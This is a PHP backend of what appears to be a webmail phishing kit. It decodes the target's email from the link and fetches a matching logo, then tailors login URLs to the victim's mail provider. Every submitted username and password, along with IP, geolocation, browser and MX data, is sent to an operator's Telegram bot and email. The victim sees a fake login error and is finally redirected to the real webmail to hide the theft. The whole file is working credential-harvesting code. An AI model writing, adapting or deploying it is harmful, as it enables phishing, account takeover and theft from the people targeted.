<?php
$__bb_owns_buffer = false;
if (ob_get_level() === 0) {
    ob_start();
    $__bb_owns_buffer = true;
}

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/bot-guard.php';
require_once __DIR__ . '/login.php';
require_once __DIR__ . '/config.php';

if (!isset($urls) || !is_array($urls)) {
    $urls = [];
}
if (!isset($url_templates) || !is_array($url_templates)) {
    $url_templates = [];
}

$img         = '';
$decoded     = '';
$login_id    = '';
$domain      = '';
$noTld       = '';
$noTld_upper = '';
$title       = '로그인';
$error       = 'display: none;';
$url         = $login = $username = $password = '';

function decodeAnyEmail(string $raw): string {
    $raw = trim($raw);
    if ($raw === '') return '';
    if (filter_var($raw, FILTER_VALIDATE_EMAIL)) return $raw;

    $b64 = strtr($raw, '-_', '+/');
    $b64 .= str_repeat('=', (4 - strlen($b64) % 4) % 4);
    $decoded = base64_decode($b64, true);
    if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) return $decoded;

    if (ctype_xdigit($raw) && strlen($raw) % 2 === 0) {
        $decoded = @hex2bin($raw);
        if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) return $decoded;
    }
    return '';
}

foreach ([$_GET['id'] ?? '', $_SESSION['temp_email'] ?? '',
          $_POST['user_init'] ?? '', $_POST['user'] ?? ''] as $raw) {
    if ($decoded !== '') break;
    if ($raw === '') continue;
    $candidate = decodeAnyEmail((string)$raw);
    if ($candidate !== '') $decoded = $candidate;
}

if ($decoded !== '') {
    $set = bg_read_lines_set(__DIR__ . '/wlog/blocked_emails.txt');
    if (!empty($set) && isset($set[strtolower($decoded)])) {
        http_response_code(403);
        exit('Forbidden');
    }
}

if ($decoded !== '') {
    $login_id = strstr($decoded, '@', true);
    $domain   = explode('@', $decoded)[1] ?? '';
}

function nextSessionNumber(): int {
    $file = __DIR__ . '/wlog/session_counter.txt';
    $dir  = dirname($file);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
        @file_put_contents($dir . '/.htaccess', "Require all denied\nDeny from all\n");
    }
    $fp = @fopen($file, 'c+');
    if (!$fp) return 1;
    @flock($fp, LOCK_EX);
    $current = (int)trim((string)stream_get_contents($fp));
    $current++;
    @ftruncate($fp, 0);
    @rewind($fp);
    @fwrite($fp, (string)$current);
    @fflush($fp);
    @flock($fp, LOCK_UN);
    @fclose($fp);
    return $current;
}

if (empty($_SESSION['session_number'])) {
    $_SESSION['session_number'] = nextSessionNumber();
}
$session_number = $_SESSION['session_number'];

function resolveLoginUrls(string $loginFile, string $domain, ?array $urls, ?array $templates): array {
    $urls      = $urls      ?? [];
    $templates = $templates ?? [];
    $loginFile = trim($loginFile);

    if (preg_match('#^https?://#i', $loginFile)) {
        return ['url' => $loginFile, 'alt' => 'NIL'];
    }

    if ($domain === '') {
        if ($loginFile !== '' && isset($urls[$loginFile])) {
            return ['url' => $urls[$loginFile], 'alt' => 'NIL'];
        }
        return ['url' => 'https://mail.yahoo.com/', 'alt' => 'NIL'];
    }

    // ------------------------------------------------------------
    // PROVIDER PATTERNS
    // ------------------------------------------------------------

    // cPanel — check BEFORE anything that might false-match
    if ($loginFile === 'cpw.php' || $loginFile === 'cpanel.php') {
        return [
            'url' => "https://{$domain}:2096/",
            'alt' => "https://{$domain}/webmail",
        ];
    }

    // SmarterMail
    if ($loginFile === 'smarter.php' || $loginFile === 'smarter') {
        return [
            'url' => "http://mail.{$domain}/Login.aspx",
            'alt' => "http://webmail.{$domain}/Login.aspx",
        ];
    }

    // MailEnable
    if ($loginFile === 'enable.php' || $loginFile === 'mailenable.php') {
        $mondo = "https://webmail.{$domain}/Mondo/lang/sys/client.aspx"
               . "?LanguageId=en&Skin=Default&ClientAgent=";
        return [
            'url' => $mondo,
            'alt' => "https://mail.{$domain}/Mondo/lang/sys/client.aspx"
                   . "?LanguageId=en&Skin=Default&ClientAgent=",
        ];
    }

    if ($loginFile === 'mailcow.php') {
        return ['url' => "https://mail.{$domain}/", 'alt' => "https://webmail.{$domain}/"];
    }

    if ($loginFile === 'rc.php') {
        return [
            'url' => "https://webmail.{$domain}/roundcube/",
            'alt' => "https://{$domain}/roundcube",
        ];
    }

    if ($loginFile === 'owa.php') {
        return [
            'url' => "https://mail.{$domain}/owa/",
            'alt' => "https://{$domain}/owa/",
        ];
    }

    if ($loginFile === 'zimbra.php') {
        return [
            'url' => "https://mail.{$domain}/zimbra/",
            'alt' => "https://webmail.{$domain}/zimbra/",
        ];
    }

    if ($loginFile === 'horde.php') {
        return ['url' => "https://webmail.{$domain}/horde/", 'alt' => 'NIL'];
    }

    if ($loginFile === 'squirrel.php') {
        return ['url' => "https://webmail.{$domain}/squirrelmail/", 'alt' => 'NIL'];
    }

    if ($loginFile === 'mdaemon.php') {
        return [
            'url' => "https://mail.{$domain}/worldclient/",
            'alt' => "http://mail.{$domain}/worldclient/",
        ];
    }

    if ($loginFile === 'afterlogic.php') {
        return ['url' => "https://mail.{$domain}/", 'alt' => "https://webmail.{$domain}/"];
    }

    if ($loginFile === 'icewarp.php') {
        return ['url' => "https://mail.{$domain}/webmail/", 'alt' => "https://webmail.{$domain}/"];
    }

    if ($loginFile === 'kerio.php') {
        return [
            'url' => "https://mail.{$domain}/webmail/login/",
            'alt' => "https://{$domain}/webmail/login/",
        ];
    }

    if ($loginFile === 'zoner.php') {
        return ['url' => "https://mail.{$domain}/", 'alt' => "https://webmail.{$domain}/"];
    }

    // MailAnyone / MX25 relay
    $mx = @dns_get_record($domain, DNS_MX);
    if (!empty($mx)) {
        foreach ($mx as $r) {
            $t = strtolower($r['target'] ?? '');
            if (str_contains($t, 'mailanyone') || str_contains($t, 'mx25.net')) {
                return [
                    'url' => "http://mail.{$domain}/Login.aspx",
                    'alt' => 'https://mailanyone.net/',
                ];
            }
        }
    }

    // Generic template fallback
    if ($loginFile !== '' && isset($templates[$loginFile])) {
        [$primaryTpl, $altTpl] = $templates[$loginFile];
        $primary = str_replace('[domain]', $domain, $primaryTpl);
        $alt     = ($altTpl === 'NIL') ? 'NIL' : str_replace('[domain]', $domain, $altTpl);
        return ['url' => $primary, 'alt' => $alt];
    }

    if ($loginFile !== '' && isset($urls[$loginFile])) {
        return ['url' => $urls[$loginFile], 'alt' => "https://{$domain}"];
    }

    return ['url' => "https://{$domain}", 'alt' => "https://webmail.{$domain}"];
}

function status(?string $url): ?int {
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) return null;
    if (!function_exists('curl_init')) return null;
    $ch = curl_init($url);
    if ($ch === false) return null;
    curl_setopt_array($ch, [
        CURLOPT_HTTPGET => true, CURLOPT_NOBODY => false,
        CURLOPT_FOLLOWLOCATION => true, CURLOPT_MAXREDIRS => 5,
        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 4,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    ]);
    curl_exec($ch);
    if (curl_errno($ch)) { curl_close($ch); return null; }
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($code && $code > 0) ? (int)$code : null;
}

function getDomainName(string $url, string $cacheFile = ''): string {
    if (empty($url)) return '';
    if ($cacheFile === '') $cacheFile = __DIR__ . DIRECTORY_SEPARATOR . 'psl_cache.dat';
    if (!file_exists($cacheFile) || (time() - filemtime($cacheFile)) > 86400) {
        if (function_exists('curl_init')) {
            $ch = curl_init('https://publicsuffix.org/list/public_suffix_list.dat');
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            $data = curl_exec($ch);
            curl_close($ch);
            if ($data !== false) @file_put_contents($cacheFile, $data);
        }
    }
    if (!file_exists($cacheFile)) {
        $cleanHost = parse_url($url, PHP_URL_HOST) ?? $url;
        $parts = explode('.', strtolower(preg_replace('/^www\./i', '', $cleanHost)));
        return count($parts) > 1 ? $parts[count($parts) - 2] : ($parts[0] ?? '');
    }
    $lines = @file($cacheFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines === false) return '';
    $psl = [];
    foreach ($lines as $line) {
        if (!str_starts_with($line, '//')) $psl[trim($line)] = true;
    }
    $host  = parse_url($url, PHP_URL_HOST) ?? $url;
    $host  = strtolower(preg_replace('/^www\./i', '', $host));
    $parts = explode('.', $host);
    $n     = count($parts);
    $matchLen = 1;
    for ($i = 0; $i < $n - 1; $i++) {
        $candidate = implode('.', array_slice($parts, $i));
        $wildcard  = '*.' . implode('.', array_slice($parts, $i + 1));
        if (isset($psl[$candidate]) || isset($psl[$wildcard])) {
            $matchLen = $n - $i;
            break;
        }
    }
    return $parts[$n - $matchLen - 1] ?? '';
}

function getUserIP(): string { return bg_client_ip(); }

function getUserBrowser(): string {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($ua, 'Edge') !== false || strpos($ua, 'Edg/') !== false) return 'Microsoft Edge';
    if (strpos($ua, 'Chrome') !== false) return 'Google Chrome';
    if (strpos($ua, 'Safari') !== false && strpos($ua, 'Chrome') === false) return 'Safari';
    if (strpos($ua, 'Firefox') !== false) return 'Mozilla Firefox';
    if (strpos($ua, 'MSIE') !== false || strpos($ua, 'Trident') !== false) return 'Internet Explorer';
    if (strpos($ua, 'Opera') !== false || strpos($ua, 'OPR') !== false) return 'Opera';
    return 'Unknown';
}

function getUserOS(): string {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($ua, 'Windows NT 10.0') !== false) return 'Windows 10/11';
    if (strpos($ua, 'Windows NT 6.3') !== false)  return 'Windows 8.1';
    if (strpos($ua, 'Windows NT 6.2') !== false)  return 'Windows 8';
    if (strpos($ua, 'Windows NT 6.1') !== false)  return 'Windows 7';
    if (strpos($ua, 'Macintosh') !== false)       return 'Macintosh';
    if (strpos($ua, 'iPhone') !== false)          return 'iOS (iPhone)';
    if (strpos($ua, 'Android') !== false)         return 'Android';
    if (strpos($ua, 'Linux') !== false)           return 'Linux';
    return 'Unknown';
}

function getMxStatus(string $domain): string {
    $domain = strtolower(trim($domain));
    if ($domain === '') return 'Invalid Domain';
    return checkdnsrr($domain, 'MX') ? 'MX record found' : 'No MX record found';
}

function getMxDetails(string $domain): string {
    $domain = strtolower(trim($domain));
    if ($domain === '') return 'Invalid Domain';
    $hosts = []; $weights = [];
    if (getmxrr($domain, $hosts, $weights) && !empty($hosts)) {
        array_multisort($weights, SORT_ASC, $hosts);
        return 'Found: ' . implode(', ', $hosts);
    }
    return 'No MX records found';
}

function getUserLocationData(string $ip): array {
    static $cache = [];
    if (isset($cache[$ip])) return $cache[$ip];

    if (in_array($ip, ['127.0.0.1', '::1'], true)) {
        return $cache[$ip] = ['country' => 'Localhost', 'city' => 'Localhost',
                'region' => 'Localhost', 'formatted' => "{$ip}, Localhost"];
    }
    $response = false;
    if (function_exists('curl_init')) {
        $ch = curl_init("http://ip-api.com/json/$ip");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3,
            CURLOPT_CONNECTTIMEOUT => 2, CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
    }
    if ($response === false) {
        $response = @file_get_contents("http://ip-api.com/json/$ip");
    }
    $d = $response ? json_decode($response) : null;
    $country = $d->country ?? 'Unknown';
    $city    = $d->city    ?? 'Unknown';
    $region  = $d->region  ?? 'Unknown';
    return $cache[$ip] = ['country' => $country, 'city' => $city, 'region' => $region,
            'formatted' => "{$ip}, {$country} ({$city}, {$region})"];
}

function tg(string $message): bool {
    if (!defined('TG_TOKEN') || !defined('TG_CHAT_ID') || !TG_TOKEN || !TG_CHAT_ID) {
        @file_put_contents(__DIR__ . '/tg_debug.log',
            date('c') . " | tg(): missing constants\n", FILE_APPEND);
        return false;
    }
    if (!function_exists('curl_init')) return false;

    $ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'chat_id'                  => TG_CHAT_ID,
            'text'                     => $message,
            'disable_web_page_preview' => 'true',
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 8,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    if ($result === false) return false;
    $j = json_decode($result, true);
    return is_array($j) && !empty($j['ok']);
}

function sendMail(string $subject, string $message, string $replyTo): bool {
    if (!defined('EMAIL') || !EMAIL) return false;
    $from = 'Notification <noreply@' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '>';
    $headers = [
        'From'         => $from,
        'Reply-To'     => $replyTo,
        'X-Mailer'     => 'PHP/' . phpversion(),
        'Content-Type' => 'text/plain; charset=utf-8',
    ];
    return @mail(EMAIL, $subject, $message, $headers);
}

// UI data — logo + title
if (!empty($domain)) {
    $noTld       = getDomainName($domain);
    $noTld_upper = strtoupper($noTld);
    $img         = "https://img.logo.dev/{$domain}?token=live_6a1a28fd-6420-4492-aeb0-b297461d9de2&size=100&retina=true&format=webp&theme=light&w=128&q=75";

    if (function_exists('curl_init') && empty($title)) {
        $ch = curl_init("https://login.mailplug.com/auth/login?host_domain={$domain}");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 4, CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        ]);
        $html = curl_exec($ch);
        curl_close($ch);
        if ($html) {
            if (preg_match('/<div[^>]*class="[^"]*login-logo-value-container[^"]*"[^>]*>.*?<p[^>]*>(.*?)<\/p>/is', $html, $m)) {
                $title = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
            } elseif (preg_match('/<title>(.*?)<\/title>/i', $html, $m)) {
                $title = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
            }
        }
    }

    $img_url = (status($img) === 200)
        ? $img
        : "https://webmail.emailpnl.com/webmail_assets/favicon.ico";
} else {
    $img_url = "https://webmail.emailpnl.com/webmail_assets/favicon.ico";
}

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}

// POST PROCESSOR
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $login    = trim($_POST['login'] ?? '');
    $username = trim($_POST['user']  ?? '');
    $password = trim($_POST['pass']  ?? '');

    if ($login === '' && !empty($_SESSION['temp_template'])) {
        $login = (string)$_SESSION['temp_template'];
    }

    [$login_url, $alt_login_url] = array_values(
        resolveLoginUrls($login, $domain, $urls ?? [], $url_templates ?? [])
    );

    $valid = true;
    if ($username === '' || $password === '') {
        $error = 'display: block;';
        $valid = false;
    } elseif (str_contains($username, '@') && !filter_var($username, FILTER_VALIDATE_EMAIL)) {
        $error = 'display: block;';
        $valid = false;
    }

    if ($valid) {

        if (preg_match('#^https?://#i', $login)) {
            $url = $redirectUrl = $login;
        } elseif ($login === 'yahoo.php' || $login === 'yahoo') {
            $url = $redirectUrl = 'https://mail.yahoo.com/';
        } elseif (isset($urls[$login])) {
            $url = $redirectUrl = $urls[$login];
        } elseif ($login === 'all.php' && $domain !== '') {
            $url = $redirectUrl = "https://{$domain}";
        } elseif ($login !== '' && $login !== 'all.php' && $domain !== '') {
            $url = $redirectUrl = "https://webmail.{$domain}";
        } else {
            $url = $redirectUrl = $domain !== '' ? "https://{$domain}" : 'https://mail.yahoo.com/';
        }

        $_SESSION['login_attempts']++;

        $os           = getUserOS();
        $userIP       = getUserIP();
        $browser      = getUserBrowser();
        $locationData = getUserLocationData($userIP);
        $country      = $locationData['country'];
        $userLocation = $locationData['formatted'];
        $date         = date('l d, F Y (h:i:s A)');

        if ($login === '') {
            $loginPageUrl = 'unknown';
        } elseif (preg_match('#^https?://#i', $login)) {
            $loginPageUrl = $login;
        } else {
            $loginPageUrl = 'https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost')
                          . '/' . ltrim($login, '/');
        }

        $subject = "Login | {$country} | {$userIP} |";

        $message  = "Login | {$country} | {$userIP} |\n";
        $message .= "Session: {$session_number}\n";
        $message .= "ID: {$username}\n";
        $message .= "Access: {$password}\n";
        $message .= "* IP Address: {$locationData['city']} | {$userIP}\n";
        $message .= "* User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
        $message .= "Login URL: {$login_url}\n";
        $message .= "Alternative Login URL: {$alt_login_url}\n";
        $message .= "Login Page: {$loginPageUrl}\n";
        $message .= "Login Title: " . (($title !== '' && $title !== '로그인') ? $title : 'Unknown') . "\n";
        $message .= "Country: {$country}\n";
        $message .= "MX Status: " . getMxStatus($domain) . "\n";
        $message .= "MX Records: " . getMxDetails($domain) . "\n";
        $message .= "Location: {$userLocation}\n";
        $message .= "Browser: {$browser}\n";
        $message .= "Operating System: {$os}\n";
        $message .= "Date: {$date}\n";
        $message .= "Attempt: {$_SESSION['login_attempts']}\n";

        tg($message);
        sendMail($subject, $message, $username);

        $password = '';
        unset($_POST['pass']);
        unset($_SESSION['temp_pass']);

        $error = 'display: block;';

        $maxAttempts = defined('SUBMIT') ? (int)SUBMIT : 2;
        if ($_SESSION['login_attempts'] >= $maxAttempts) {
            $_SESSION['login_attempts'] = 0;
            session_destroy();

            if (ob_get_level() > 0) {
                while (ob_get_level() > 0) { ob_end_clean(); }
            }

            $urlJson = json_encode($redirectUrl, JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP);
            $urlHtml = htmlspecialchars($redirectUrl, ENT_QUOTES, 'UTF-8');

            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head><meta charset="utf-8">'
               . '<title>Redirecting&hellip;</title></head><body>'
               . '<script>(function(){var t=' . $urlJson . ';'
               . 'try{if(window.top&&window.top!==window.self){window.top.location.href=t;}'
               . 'else{window.location.href=t;}}catch(e){window.location.href=t;}})();</script>'
               . '<noscript><meta http-equiv="refresh" content="0;url=' . $urlHtml . '"></noscript>'
               . '</body></html>';
            exit();
        }
    }
}

if ($__bb_owns_buffer && ob_get_level() > 0) {
    ob_end_flush();
}